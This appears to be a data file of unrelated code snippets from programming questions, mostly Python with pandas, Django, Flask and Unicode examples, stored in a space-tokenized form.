"# ! /usr/bin/env pythoncount=0words = set ( line.strip ( ) for line in open ( `` /Users/andrew/Downloads/Moby/mwords/354984si.ngl '' ) ) for w in words : even , odd = w [ : :2 ] , w [ 1 : :2 ] if even in words and odd in words : count+=1print count # import < Foundation/Foundation.h > NSString *sliceString ( NSString *inString , NSUInteger start , NSUInteger stop , NSUInteger step ) { NSUInteger strLength = [ inString length ] ; if ( stop > strLength ) { stop = strLength ; } if ( start > strLength ) { start = strLength ; } NSUInteger capacity = ( stop-start ) /step ; NSMutableString *rtr= [ NSMutableString stringWithCapacity : capacity ] ; for ( NSUInteger i=start ; i < stop ; i+=step ) { [ rtr appendFormat : @ '' % c '' , [ inString characterAtIndex : i ] ] ; } return rtr ; } NSSet * getDictWords ( NSString *path ) { NSError *error = nil ; NSString *words = [ [ NSString alloc ] initWithContentsOfFile : path encoding : NSUTF8StringEncoding error : & error ] ; NSCharacterSet *sep= [ NSCharacterSet newlineCharacterSet ] ; NSPredicate *noEmptyStrings = [ NSPredicate predicateWithFormat : @ '' SELF ! = `` '' ] ; if ( words == nil ) { // deal with error ... } // ... NSArray *temp= [ words componentsSeparatedByCharactersInSet : sep ] ; NSArray *lines = [ temp filteredArrayUsingPredicate : noEmptyStrings ] ; NSSet *rtr= [ NSSet setWithArray : lines ] ; NSLog ( @ '' lines : % lul , word set : % lul '' , [ lines count ] , [ rtr count ] ) ; [ words release ] ; return rtr ; } int main ( int argc , const char * argv [ ] ) { NSAutoreleasePool * pool = [ [ NSAutoreleasePool alloc ] init ] ; int count=0 ; NSSet *dict = getDictWords ( @ '' /Users/andrew/Downloads/Moby/mwords/354984si.ngl '' ) ; NSLog ( @ '' Start '' ) ; for ( NSString *element in dict ) { NSString *odd_char=sliceString ( element , 1 , [ element length ] , 2 ) ; NSString *even_char=sliceString ( element , 0 , [ element length ] , 2 ) ; if ( [ dict member : even_char ] & & [ dict member : odd_char ] ) { count++ ; } } NSLog ( @ '' count= % i '' , count ) ; [ pool drain ] ; return 0 ; } # ! /usr/bin/env pythonimport codecscount=0words = set ( line.strip ( ) for line in codecs.open ( `` /Users/andrew/Downloads/Moby/mwords/354984si.ngl '' , encoding='utf-8 ' ) ) for w in words : if w [ : :2 ] in words and w [ 1 : :2 ] in words : count+=1print count for ( NSUInteger i=start ; i < stop ; i+=step ) { buf [ 0 ] = [ inString characterAtIndex : i ] ; [ rtr appendString : [ NSString stringWithCharacters : buf length:1 ] ] ; }"
"temp = [ ' A ' , ' B ' , ' A ' , ' B ' , ' A ' , ' B ' ] [ 'A_1 ' , 'B_1 ' , 'A_2 ' , 'B_2 ' , 'A_3 ' , 'B_3 ' ] [ j + `` _ '' + str ( i ) for i , j in zip ( [ 1 , 1 , 2 , 2 , 3 , 3 ] , temp ) ]"
"p1 p2 p3 p40 0 9 1 41 0 2 3 42 1 3 10 73 1 5 3 14 2 3 7 10 Top1 Top2 Top30 p2 p4 p31 p4 p3 p22 p3 p4 p23 p2 p3 p14 p4 p3 p2 res = pd.DataFrame ( df.columns [ df.values.argsort ( 1 ) ] ) .iloc [ : , len ( df.index ) : 0 : -1 ] n = 3parts = np.argpartition ( -df.values , n , axis=1 ) [ : , : -1 ] args = ( -df.values [ np.arange ( df.shape [ 0 ] ) [ : , None ] , parts ] ) .argsort ( 1 ) res = pd.DataFrame ( df.columns [ parts [ np.arange ( df.shape [ 0 ] ) [ : , None ] , args ] ] , columns= [ f'Top { i } ' for i in range ( 1 , n+1 ) ] ) # Python 3.6.0 , NumPy 1.11.3 , Pandas 0.19.2import pandas as pd , numpy as npdf = pd.DataFrame ( { 'p1 ' : [ 0 , 0 , 1 , 1 , 2 ] , 'p2 ' : [ 9 , 2 , 3 , 5 , 3 ] , 'p3 ' : [ 1 , 3 , 10 , 3 , 7 ] , 'p4 ' : [ 4 , 4 , 7 , 1 , 10 ] } ) def full_sort ( df ) : return pd.DataFrame ( df.columns [ df.values.argsort ( 1 ) ] ) .iloc [ : , len ( df.index ) : 0 : -1 ] def partial_sort ( df ) : n = 3 parts = np.argpartition ( -df.values , n , axis=1 ) [ : , : -1 ] args = ( -df.values [ np.arange ( df.shape [ 0 ] ) [ : , None ] , parts ] ) .argsort ( 1 ) return pd.DataFrame ( df.columns [ parts [ np.arange ( df.shape [ 0 ] ) [ : , None ] , args ] ] ) df = pd.concat ( [ df ] *10**5 ) % timeit full_sort ( df ) # 86.3 ms per loop % timeit partial_sort ( df ) # 158 ms per loop"
"Subject = panelnd.create_nd_panel_factory ( klass_name='Subject ' , axis_orders= [ 'setsize ' , 'location ' , 'vfield ' , 'channels ' , 'samples ' ] , axis_slices= { 'labels ' : 'location ' , 'items ' : 'vfield ' , 'major_axis ' : 'major_axis ' , 'minor_axis ' : 'minor_axis ' } , slicer=pd.Panel4D , axis_aliases= { 'ss ' : 'setsize ' , 'loc ' : 'location ' , 'vf ' : 'vfield ' , 'major ' : 'major_axis ' , 'minor ' : 'minor_axis ' } # stat_axis=2 # dafuq is this ? ) # ... do some boring stuff to get the text files , etc ... for _ , factors in df.iterrows ( ) : # ` factors ` is a 4-tuple containing # ( subject number , setsize , location , vfield , # and path to the tab-delimited file ) . sn , ss , loc , vf , path = factors eeg = pd.read_table ( path , sep='\t ' , names=range ( 1 , 129 ) + [ 'ref ' ] , header=None ) # build nested dict subjects.setdefault ( sn , { } ) .setdefault ( ss , { } ) .setdefault ( loc , { } ) [ vf ] = eeg # and now attempt to build ` Subject ` for sn , d in subjects.iteritems ( ) : subjects [ sn ] = Subject ( d ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -KeyError Traceback ( most recent call last ) < ipython-input-2-831fa603ca8f > in < module > ( ) -- -- > 1 import_data ( ) /home/louist/Dropbox/Research/VSTM/scripts/vstmlib.py in import_data ( ) 64 65 import ipdb ; ipdb.set_trace ( ) -- - > 66 for sn , d in subjects.iteritems ( ) : 67 subjects [ sn ] = Subject ( d ) 68 /usr/local/lib/python2.7/dist-packages/pandas/core/panelnd.pyc in __init__ ( self , *args , **kwargs ) 65 if 'dtype ' not in kwargs : 66 kwargs [ 'dtype ' ] = None -- - > 67 self._init_data ( *args , **kwargs ) 68 klass.__init__ = __init__ 69 /usr/local/lib/python2.7/dist-packages/pandas/core/panel.pyc in _init_data ( self , data , copy , dtype , **kwargs ) 250 mgr = data 251 elif isinstance ( data , dict ) : -- > 252 mgr = self._init_dict ( data , passed_axes , dtype=dtype ) 253 copy = False 254 dtype = None/usr/local/lib/python2.7/dist-packages/pandas/core/panel.pyc in _init_dict ( self , data , axes , dtype ) 293 raxes = [ self._extract_axis ( self , data , axis=i ) 294 if a is None else a for i , a in enumerate ( axes ) ] -- > 295 raxes_sm = self._extract_axes_for_slice ( self , raxes ) 296 297 # shallow copy/usr/local/lib/python2.7/dist-packages/pandas/core/panel.pyc in _extract_axes_for_slice ( self , axes ) 1477 `` '' '' return the slice dictionary for these axes `` '' '' 1478 return dict ( [ ( self._AXIS_SLICEMAP [ i ] , a ) for i , a- > 1479 in zip ( self._AXIS_ORDERS [ self._AXIS_LEN - len ( axes ) : ] , axes ) ] ) 1480 1481 @ staticmethodKeyError : 'location '"
"test1=nlme.lme ( r.formula ( 'Pupil~CoI*Time ' ) , random=r.formula ( '~1|ID ' ) , data=dfr ) test2=nlme.lme ( r.formula ( 'Pupil~CoI*measurement ' ) , random=r.formula ( '~1|ID ' ) , data=dfr ) test1_sum= r.summary ( test1 ) test2_sum= r.summary ( test2 ) print test1_sumprint test2_sum test1=lme4.lmer ( r.formula ( 'Pupil~CoI*Time+ ( 1|ID ) ' ) , data=dfr ) test2=lme4.lmer ( r.formula ( 'Pupil~CoI*measurement+ ( 1|ID ) ' ) , data=dfr ) test1_sum= r.summary ( test1 ) test2_sum= r.summary ( test2 ) print test1_sumprint test2_sum Data : structure ( list ( CoI = structure ( c ( 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L , 1L ... ... Random effects : Formula : ~1 | ID ( Intercept ) ResidualStdDev : 0.2201214 0.1199874Fixed effects : Pupil ~ CoI * measurement Value Std.Error DF t-value p-value ( Intercept ) 1.2068660 0.06369911 5769 18.946357 0CoIhard -0.0394413 0.00629117 5769 -6.269306 0measurement -0.0002743 0.00003207 5769 -8.554287 0CoIhard : measurement 0.0005227 0.00004536 5769 11.524511 0 Correlation : ( Intr ) CoIhrd msrmntCoIhard -0.049 measurement -0.060 0.612 CoIhard : measurement 0.043 -0.865 -0.707Standardized Within-Group Residuals : Min Q1 Med Q3 Max -9.86773055 -0.37638950 0.02085029 0.43203795 4.97364143 Number of Observations : 5784Number of Groups : 12"
"from flask import Flask , request , sessionapplication = Flask ( __name__ ) application.secret_key = `` some_random_string '' @ application.route ( `` /enter_string '' ) def start_session ( ) : session [ `` string '' ] = request.args [ `` string '' ] @ application.route ( `` /get_string '' ) def continue_session ( ) : if `` string '' not in session : return `` Give me a string first ! '' return `` You entered `` + session [ `` string '' ] if __name__ == `` __main__ '' : application.debug = True application.run ( )"
"# Use as function set_active_language ( `` en '' ) # Use as context managerwith set_active_language ( `` en '' ) : ... active_language = None # global variable to store active languageclass set_active_language ( object ) : def __init__ ( self , language ) : global active_language self.previous_language = active_language active_language = language def __enter__ ( self ) : pass def __exit__ ( self , *args ) : global active_language active_language = self.previous_language"
"x = np.array ( [ 4 , 1 , 10 , 5 , 8 , 13 , 11 ] ) y = np.array ( [ 20 , 5 , 4 , 9 , 11 , 7 , 25 ] ) mx = np.array ( [ 0 , 3 , 6 ] ) my = np.array ( [ 2 , 1 , 4 ] )"
class Evento ( models.Model ) : [ ... ] user = ForeignKey ( model=User ) class EventoForm ( forms.ModelForm ) : class Meta : model = Evento
"In [ 1 ] : import pandas as pdIn [ 2 ] : df = pd.read_csv ( 'Test.csv ' , index_col=0 , parse_dates=True ) In [ 3 ] : df.indexOut [ 3 ] : DatetimeIndex ( [ '2016-07-01 09:05:07 ' , '2016-07-01 09:05:09 ' , '2016-07-01 09:05:10 ' , '2016-07-01 09:05:11 ' , '2016-07-01 09:05:12 ' , '2016-07-01 09:05:13 ' , '2016-07-01 09:05:14 ' , '2016-07-01 09:05:15 ' ] , dtype='datetime64 [ ns ] ' , name='DateTime ' , freq=None ) In [ 4 ] : date_parser = lambda x : pd.to_datetime ( x ) .tz_localize ( None ) In [ 5 ] : df = pd.read_csv ( 'Test.csv ' , index_col=0 , parse_dates=True , date_parser=date_parser )"
ESC [ 1 ; 36m TEXT TO FOLLOW : ESC [ 1 ; 37m
getpgrp ( ) == tcgetpgrp ( STDOUT_FILENO ) ; ./tty_testsisatty reports 1pgrps are 13619 and 13619 ./retry.py -v -- ./tty_testscommand is [ './tty_tests ' ] isatty reports 1pgrps are 13614 and -1child finished : rc = 0Ran command 1 times
> > > u'中文 ' == '中文'.decode ( 'gbk ' ) False//The first one is u'\xd6\xd0\xce\xc4 ' while the second one u'\u4e2d\u6587 ' a = '中文'.decode ( 'gbk ' ) > > > au'\u4e2d\u6587 ' > > > print a中文 > > > b = u'中文 ' > > > print bÖÐÎÄ
"class MyModel ( models.Model ) : FOO = 1 BAR = 2 GOO = 3 BLAH_TYPES = ( ( FOO , 'Foodally boogaly ' ) , ( BAR , 'Bar bar bar bar ' ) , ( GOO , 'Goo goo gaa gaa ' ) , ) TYPE_FOR_ID = dict ( BLAH_TYPES ) ID_FOR_TYPE = dict ( zip ( TYPE_FOR_ID.values ( ) , TYPE_FOR_ID.keys ( ) ) ) blah = models.IntegerField ( choices=BLAH_TYPES )"
from selenium import webdriverdriver = webdriver.Chrome ( ) driver.get ( 'wwww.etherdelta.com ' )
"some_data = [ { 'value ' : 2 , 'date ' : '2016-02-06 ' } , { 'value ' : 1 , 'date ' : '2016-02-07 ' } , { 'value ' : 5 , 'date ' : '2016-02-08 ' } , { 'value ' : 3 , 'date ' : '2016-02-09 ' } , { 'value ' : 1 , 'date ' : '2016-02-10 ' } , ] def values_incremented ( some_data ) : temp_sum = 0 result = [ ] for element in some_data : temp_sum += element [ 'value ' ] result.append ( { 'value ' : temp_sum , 'date ' : element [ 'date ' ] } ) return result return [ { 'value ' : somehow_incremented , 'date ' : element [ 'date ' ] } for element in some_data ]"
"[ i.something ( ) for i in l ] map ( operator.methodcaller ( 'something ' ) , l ) map ( lambda x : x.something ( ) , l )"
"class A ( object ) : def a_method ( self ) : if self.check_var is True : ( some_code ) else : raise Exception class A ( object ) : def decorator ( function ) : def function_wrapper ( self , *args , **kwargs ) : if self.check_var is True : return function ( self , *args , **kwargs ) else : raise Exception return function_wrapper @ decorator def a_method ( self ) : ( some_code ) class A ( object ) : @ classmethod # maybe def decorator ( function ) : def function_wrapper ( self , *args , **kwargs ) : if self.check_var is True : return function ( self , *args , **kwargs ) else : raise Exception return function_wrapper @ decorator def a_method ( self ) : ( some_code ) class B ( A ) : @ decorator def b_method ( self ) : ( some_code )"
"import logginglogger = logging.getLogger ( __name__ ) # name is myapp.models logger.debug ( `` Here is my message '' ) 'handlers ' : { 'null ' : { 'level ' : 'DEBUG ' , 'class ' : 'django.utils.log.NullHandler ' , } , 'logfile ' : { 'level ' : 'DEBUG ' , 'class ' : 'logging.FileHandler ' , 'filename ' : ' % s/log/development.log ' % PROJECT_DIR , 'formatter ' : 'simple ' } , } , 'loggers ' : { 'django ' : { 'level ' : 'DEBUG ' , 'handlers ' : [ 'null ' ] } , 'myapp ' : { 'handlers ' : [ 'logfile ' ] , 'level ' : 'DEBUG ' , } ,"
"import jsonws = [ ] with open ( 'messages.txt ' , ' r ' ) as f : for line in f : data = json.loads ( line ) ws.append ( data )"
public void WhiteSpaceSig ( ) { List < string > names = new List < string > ( ) ; List < string > colors = new List < string > ( ) ; foreach ( string name in names ) { foreach ( string color in colors ) { // bla bla bla } } } # SigSpace public void WhiteSpaceSig ( ) List < string > names = new List < string > ( ) List < string > colors = new List < string > ( ) foreach ( string name in names ) foreach ( string color in colors ) // bla bla bla
"b'\xc2\xa0\x38'.replace ( u'\xc2\xa0 ' , '' '' ) b'\xc2\xa0\x38'.replace ( u'\xc2a0 ' , '' '' ) TypeError : a bytes-like object is required , not 'str ' Unicode code point character UTF-8 ( hex . ) nameU+00A0 c2 a0 NO-BREAK SPACE"
import win32clipboardwin32clipboard.OpenClipboard ( ) data = win32clipboard.GetClipboardData ( ) win32clipboard.CloseClipboard ( ) print data
template < class T > class Foo : T { void fun ( ) { } }
"def attrsetter ( name ) : def setter ( obj , val ) : setattr ( obj , name , val ) return setter"
"import timedef get_primes ( n ) : numbers = set ( range ( n , 1 , -1 ) ) primes = [ ] while numbers : p = numbers.pop ( ) primes.append ( p ) numbers.difference_update ( set ( range ( p*2 , n+1 , p ) ) ) return primesstart = time.time ( ) get_primes ( 10000 ) print time.time ( ) - start function get_primes ( n ) numbers = [ 2 : n ] primes = Int [ ] while numbers ! = [ ] p = numbers [ 1 ] push ! ( primes , p ) numbers = setdiff ( numbers , [ p*i for i=1 : int ( n/p ) ] ) end return primesend @ time get_primes ( 10000 ) ;"
if x == 1 or x == 5 or x == 10 or x == 22 : pass
"class Foo : `` stores attrs '' foo = Foo ( ) setattr ( foo , `` bar.baz '' , `` this ca n't be reached '' ) dir ( foo ) foo.bar.bazTraceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > AttributeError : 'Foo ' object has no attribute 'bar ' import reclass Safe : `` stores attrs '' def __setattr__ ( self , attr , value ) : if not re.match ( r '' ^\w [ \w\d\- ] + $ '' , attr ) : raise AttributeError ( `` Invalid characters in attribute name '' ) else : super ( ) .__setattr__ ( attr , value )"
"browse_to ( 'www.google.com ' ) type_in_input ( 'search ' , 'query ' ) click_button ( 'search ' ) list = get_all ( ' < p > ' )"
"File `` < frozen importlib._bootstrap > '' , line 994 , in _gcd_import File `` < frozen importlib._bootstrap > '' , line 971 , in _find_and_load File `` < frozen importlib._bootstrap > '' , line 955 , in _find_and_load_unlocked File `` < frozen importlib._bootstrap > '' , line 665 , in _load_unlocked File `` < frozen importlib._bootstrap_external > '' , line 678 , in exec_module File `` < frozen importlib._bootstrap > '' , line 219 , in _call_with_frames_removed File `` /home/vmagent/app/run.py '' , line 8 , in < module > app = create_app ( os.getenv ( 'FLASK_CONFIG ' ) or 'default ' ) File `` /home/vmagent/app/application/__init__.py '' , line 43 , in create_app from .main import main as main_blueprint File `` /home/vmagent/app/application/main/__init__.py '' , line 5 , in < module > from . import cron_jobs , views File `` /home/vmagent/app/application/main/cron_jobs.py '' , line 4 , in < module > from google.cloud import datastore File `` /env/lib/python3.6/site-packages/google/cloud/datastore/__init__.py '' , line 60 , in < module > from google.cloud.datastore.batch import Batch File `` /env/lib/python3.6/site-packages/google/cloud/datastore/batch.py '' , line 24 , in < module > from google.cloud.datastore import helpers File `` /env/lib/python3.6/site-packages/google/cloud/datastore/helpers.py '' , line 29 , in < module > from google.cloud.datastore_v1.proto import datastore_pb2 File `` /env/lib/python3.6/site-packages/google/cloud/datastore_v1/__init__.py '' , line 18 , in < module > from google.cloud.datastore_v1.gapic import datastore_client File `` /env/lib/python3.6/site-packages/google/cloud/datastore_v1/gapic/datastore_client.py '' , line 18 , in < module > import google.api_core.gapic_v1.client_info File `` /env/lib/python3.6/site-packages/google/api_core/gapic_v1/__init__.py '' , line 26 , in < module > from google.api_core.gapic_v1 import method_async # noqa : F401 File `` /env/lib/python3.6/site-packages/google/api_core/gapic_v1/method_async.py '' , line 20 , in < module > from google.api_core import general_helpers , grpc_helpers_async File `` /env/lib/python3.6/site-packages/google/api_core/grpc_helpers_async.py '' , line 145 , in < module > class _WrappedStreamUnaryCall ( _WrappedUnaryResponseMixin , _WrappedStreamRequestMixin , aio.StreamUnaryCall ) : AttributeError : module 'grpc.experimental.aio ' has no attribute 'StreamUnaryCall ' google-cloud-datastore==1.12.0grpcio==1.27.2"
"new_list = [ ] for foo in foos : if foo.location==2 : new_list.append ( foo ) new_list = [ ] new_list = map ( if foo.location ==2 , foos ) // this is wrong code but is something like this possible . ?"
"@ override_settings ( CELERY_ALWAYS_EAGER=True , BROKER_BACKEND='memory ' , CELERY_EAGER_PROPAGATES_EXCEPTIONS=True ) def test_foo ( self ) : ..."
"import unicodedataunicode_string = unicodedata.normalize ( 'NFKD ' , unicode ( string ) )"
def f ( a ) : def g ( ) : print ( eval ( ' a ' ) ) return g ( ) def f ( a ) : def g ( ) : b = a + 1 print ( eval ( ' a ' ) ) return g ( )
"def trace ( fn ) : def wrapper ( instance , *args , **kwargs ) : result = fn ( instance , *args , **kwargs ) # trace logic ... return result return wrapperclass BaseClass ( object ) : def __init__ ( self , ... ) : ... self.__call__ = trace ( self.__call__ ) # line added to end of method"
"from django.shortcuts import renderfrom django.shortcuts import renderfrom django.http import HttpResponse , HttpResponseRedirectfrom django import formsfrom django.core.mail import send_mail , EmailMessagefrom StudioHanel.forms import ContactFormimport tracebackimport time # import the logging libraryimport loggingimport sys # Get an instance of a logger # logger = logging.getLogger ( 'APPNAME ' ) def contact ( request ) : logger.debug ( 'Contact Start ! ' ) if request.method == 'POST ' : etc ... LOGGING = { 'version ' : 1 , 'disable_existing_loggers ' : False , 'filters ' : { 'require_debug_false ' : { ' ( ) ' : 'django.utils.log.RequireDebugFalse ' } } , 'handlers ' : { 'mail_admins ' : { 'level ' : 'ERROR ' , 'filters ' : [ 'require_debug_false ' ] , 'class ' : 'django.utils.log.AdminEmailHandler ' } , 'applogfile ' : { 'level ' : 'DEBUG ' , 'class ' : 'logging.handlers.RotatingFileHandler ' , 'filename ' : os.path.join ( '/var/log/apache2 ' , 'APPNAME.log ' ) , 'maxBytes ' : 1024*1024*15 , 15MB 'backupCount ' : 10 , } , } , 'loggers ' : { 'django.request ' : { 'handlers ' : [ 'mail_admins ' ] , 'level ' : 'ERROR ' , 'propagate ' : True , } , 'APPNAME ' : { 'handlers ' : [ 'applogfile ' , ] , 'level ' : 'DEBUG ' , } , } }"
df.isnull ( ) .any ( ) .any ( )
"class User ( Base ) : id = Column ( ... ) __name__ = None __parent__ = NoneClass Project ( Base ) : id = Column ( ... ) __name__ = None __parent__ = None owner_id = Column ( ... ForeignKey ( User.id ) ) owner = relationship ( User , ... )"
ipdb > Decimal ( 71.60 ) == Decimal ( 71.60 ) Trueipdb > Decimal ( '71.60 ' ) == Decimal ( '71.60 ' ) Trueipdb > Decimal ( 71.60 ) == Decimal ( '71.60 ' ) False
"slice ( 1 , 2 ) < slice ( 3 , 4 ) # True"
"class C : def f ( self ) : pass exec ( 'd = ' + `` . '' .join ( x.__qualname__.split ( ' . ' ) [ : -1 ] ) ) def ensure_finished ( iterator ) : try : next ( iterator ) except StopIteration : return else : raise RuntimeErrordef derived_generator ( method ) : def new_method ( self , *args , **kwargs ) : x = method ( self , *args , **kwargs ) y = getattr ( super ( ? ? ? , self ) , method.__name__ ) \ ( *args , **kwargs ) for a , b in zip ( x , y ) : assert a is None and b is None yield ensure_finished ( x ) ensure_finished ( y ) return new_method"
"sudo rabbitmqctl set_vm_memory_high_watermark 0.9 [ { rabbit , [ { loopback_users , [ ] } , { vm_memory_high_watermark , 0.9 } ] } ] . from kombu import Connectiondef send_message_to_queue ( host , port , queue_name , message ) : `` '' '' Sends a single message to the queue . '' '' '' with Connection ( 'amqp : //guest : guest @ % s : % s// ' % ( host , port ) ) as conn : simple_queue = conn.SimpleQueue ( name=queue_name , no_ack=True ) simple_queue.put ( message ) simple_queue.close ( ) with Connection ( 'amqp : //whatever : whatever @ whatever : whatever// ' ) as conn : while True : queue = conn.SimpleQueue ( queue_name ) message = queue.get ( block=True ) message.ack ( )"
< div py : if= '' len ( c.messages ) > 0 '' > < py : for each= '' msg in c.messages '' > < strong > $ { msg } < /strong > < /py : for > < /div >
"Alias /tooltrack/static `` C : /Users/myfolder/Bitnami Django Stack Projects/tooltrack/static/ '' < Directory `` C : /Users/myfolder/Bitnami Django Stack Projects/tooltrack/static/ '' > Options +MultiViewsAllowOverride All < IfVersion < 2.3 > Order allow , deny Allow from all < /IfVersion > < IfVersion > = 2.3 > Require all granted < /IfVersion > < IfVersion < 2.3 > Order allow , deny Allow from all < /IfVersion > < IfVersion > = 2.3 > Require all granted < /IfVersion > < /Directory > WSGIScriptAlias / ' C : /Users/myfolder/Bitnami Django Stack projects/tooltrack/tooltrack/wsgi.py ' < Directory `` C : /Users/myfolder/Bitnami Django Stack projects/tooltrack/tooltrack '' > Options +MultiViewsAllowOverride All < IfVersion < 2.3 > Order allow , deny Allow from all < /IfVersion > < IfVersion > = 2.3 > Require all granted < /IfVersion > < IfVersion < 2.3 > Order allow , deny Allow from all < /IfVersion > < IfVersion > = 2.3 > Require all granted < /IfVersion > < /Directory > < Directory `` C : /Users/myfolder/Bitnami Django Stack projects/tooltrack '' > Options +MultiViewsAllowOverride All < IfVersion < 2.3 > Order allow , deny Allow from all < /IfVersion > < IfVersion > = 2.3 > Require all granted < /IfVersion > < /Directory > def panda_dataframe_r ( ) : print 'importing pandas ' + str ( timezone.now ( ) ) import pandasprint 'import done ' + str ( timezone.now ( ) )"
"def _bytes_feature ( value ) : return tf.train.Feature ( bytes_list=tf.train.BytesList ( value= [ value ] ) ) File `` /home/rklopfer/.virtualenvs/tf/local/lib/python2.7/site-packages/google/protobuf/internal/python_message.py '' , line 512 , in init copy.extend ( field_value ) File `` /home/rklopfer/.virtualenvs/tf/local/lib/python2.7/site-packages/google/protobuf/internal/containers.py '' , line 275 , in extend new_values = [ self._type_checker.CheckValue ( elem ) for elem in elem_seq_iter ] File `` /home/rklopfer/.virtualenvs/tf/local/lib/python2.7/site-packages/google/protobuf/internal/type_checkers.py '' , line 108 , in CheckValue raise TypeError ( message ) TypeError : u'Gross ' has type < type 'unicode ' > , but expected one of : ( < type 'str ' > , )"
"# 'activation ' is a numpy array of 3D activations from the convolutional code ( not shown here ) skimage.measure.block_reduce ( activation , block_size= ( 1 , 1 , 2 , 2 ) , func=np.mean ) # delta is a numpy array of 3D error matrices back-propagated from the upper layersdelta = delta.repeat ( 2 , axis=2 ) .repeat ( 2 , axis=3 )"
"import optparseimport unittestimport sysimport osfrom tests import testvalidatorfrom tests import testmodifierfrom tests import testimporter # modify the path so that the test modules under /tests have access to the project rootsys.path.insert ( 0 , os.path.dirname ( __file__ ) ) def run ( verbosity ) : if verbosity == `` 0 '' : sys.stdout = open ( os.devnull , ' w ' ) test_suite = unittest.TestSuite ( ) test_suite.addTest ( unittest.TestLoader ( ) .loadTestsFromTestCase ( testvalidator.TestValidator ) ) test_suite.addTest ( unittest.TestLoader ( ) .loadTestsFromTestCase ( testmodifier.TestModifier ) ) test_suite.addTest ( unittest.TestLoader ( ) .loadTestsFromTestCase ( testimporter.TestDataImporter ) ) unittest.TextTestRunner ( verbosity=int ( verbosity ) ) .run ( test_suite ) if __name__ == `` __main__ '' : # a simple way to control output verbosity parser = optparse.OptionParser ( ) parser.add_option ( `` -- verbosity '' , `` -- verbosity '' , dest= '' verbosity '' , default= '' 0 '' ) ( options , args ) = parser.parse_args ( ) run ( options.verbosity )"
"> > > a = u'\N { MAHJONG TILE GREEN DRAGON } ' > > > au'\U0001f005 ' > > > len ( a ) 2 > > > a [ 0 ] , a [ 1 ] ( u'\ud83c ' , u'\udc05 ' ) > > > [ hex ( ord ( c ) ) for c in a.encode ( 'utf-16be ' ) ] [ '0xd8 ' , '0x3c ' , '0xdc ' , '0x5 ' ]"
"def foo ( value : int ) - > None : print ( value , type ( value ) ) foo ( None ) error : Argument 1 to `` foo '' has incompatible type `` None '' ; expected `` int '' def foo ( value : int=None ) - > None : print ( value , type ( value ) ) foo ( None )"
"import pandas as pdimport dask.dataframe as ddimport numpy as npimport re # First approachstore = pd.HDFStore ( 'files_DFs.h5 ' ) chunk_size = 1e6df_chunk = pd.read_csv ( file , sep= '' \t '' , chunksize=chunk_size , usecols= [ ' a ' , ' b ' ] , converters= { `` a '' : lambda x : np.float32 ( re.sub ( r '' [ ^\d . ] '' , `` '' , x ) ) , \ `` b '' : lambda x : np.float32 ( re.sub ( r '' [ ^\d . ] '' , `` '' , x ) ) } , skiprows=15 ) chunk_list = [ ] for chunk in df_chunk : chunk_list.append ( chunk ) df = pd.concat ( chunk_list , ignore_index=True ) store [ dfname ] = dfstore.close ( ) # Second approachdf = dd.read_csv ( file , sep= '' \t '' , usecols= [ ' a ' , ' b ' ] , converters= { `` a '' : lambda x : np.float32 ( re.sub ( r '' [ ^\d . ] '' , `` '' , x ) ) , \ `` b '' : lambda x : np.float32 ( re.sub ( r '' [ ^\d . ] '' , `` '' , x ) ) } , skiprows=15 ) store.put ( dfname , df.compute ( ) ) store.close ( ) a b599.998413 14.142895599.998413 20.105534599.998413 6.553850599.998474 27.116098599.998474 13.060312599.998474 13.766775599.998596 1.826706599.998596 18.275938599.998718 20.797491599.998718 6.132450 ) 599.998718 41.646194599.998779 19.145775"
"B = bipartite.gnmk_random_graph ( 5,6,10 ) bottom_nodes , top_nodes = bipartite.sets ( B ) networkx.exception.AmbiguousSolution : Disconnected graph : Ambiguous solution for bipartite sets ."
"`` first token , < second token part 1 , second token part 2 > , third token '' list [ 0 ] = `` first token '' list [ 1 ] = `` second token part 1 , second token part 2 '' list [ 2 ] = `` third token ''"
"comments = db.Table ( 'ngrams ' , db.Column ( 'unigram_id ' , db.String , db.ForeignKey ( 'comment.id ' ) ) , db.Column ( 'comment_id ' , db.String , db.ForeignKey ( 'unigram.id ' ) ) ) class Unigram ( db.Model ) : id = db.Column ( db.String , primary_key=True , unique=True ) times_occurred = db.Column ( db.Integer ) occurs_in = db.relationship ( 'Comment ' , secondary=comments , backref=db.backref ( 'unigrams ' , lazy='dynamic ' ) ) class Comment ( db.Model ) : id = db.Column ( db.String , primary_key=True , unique=True ) creation_time = db.Column ( db.DateTime ) current = Unigram.query.filter ( Unigram.id == ngram ) .first ( ) if current : current.times_occurred += counts [ ngram ] [ 'count ' ] current.occurs_in.extend ( counts [ ngram ] [ 'occurences ' ] ) else : current = Unigram ( ngram , counts [ ngram ] [ 'count ' ] , counts [ ngram ] [ 'occurences ' ] ) db.session.add ( current )"
"( node1 , node2 , weight ) ( A , B,2 ) ( A , C,5 ) ( C , A,2 ) ( A , C,5 ) ( A , B,2 ) ( C , A,2 )"
